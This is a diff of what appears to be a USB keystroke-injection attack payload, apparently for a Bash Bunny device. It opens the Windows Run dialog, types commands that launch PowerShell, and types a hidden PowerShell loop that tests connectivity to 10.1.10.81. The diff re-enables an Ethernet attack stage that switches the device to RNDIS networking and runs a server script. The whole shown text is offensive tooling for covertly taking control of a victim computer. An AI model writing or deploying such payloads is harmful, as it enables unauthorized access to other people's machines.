@@ -49,7 +49,7 @@ LED STAGE2
 DELAY 500
 Q GUI r
 Q DELAY 1000
-Q STRING powershell Start-Process powershell -WindowStyle hidden
+Q STRING powershell Start-Process powershell
 # Q STRING powershell Start-Process powershell -WindowStyle hidden -Verb runAs
 Q DELAY 1000
 Q ENTER
@@ -72,13 +72,13 @@ Q STRING "powershell -W Hidden \"while (\$true) {If (Test-Connection 10.1.10.81 
 Q DELAY 300
 Q ENTER
 
-#LED W
+LED W
 # Ethernet Attack Starts
-#ATTACKMODE RNDIS_ETHERNET
-#LED CLEANUP
-#Q DELAY 200
-#LED B
-#python $SWITCHDIR/server.py
+ATTACKMODE RNDIS_ETHERNET
+LED CLEANUP
+Q DELAY 200
+LED B
+python $SWITCHDIR/server.py
 
 Q DELAY 5000
 LED FINISH
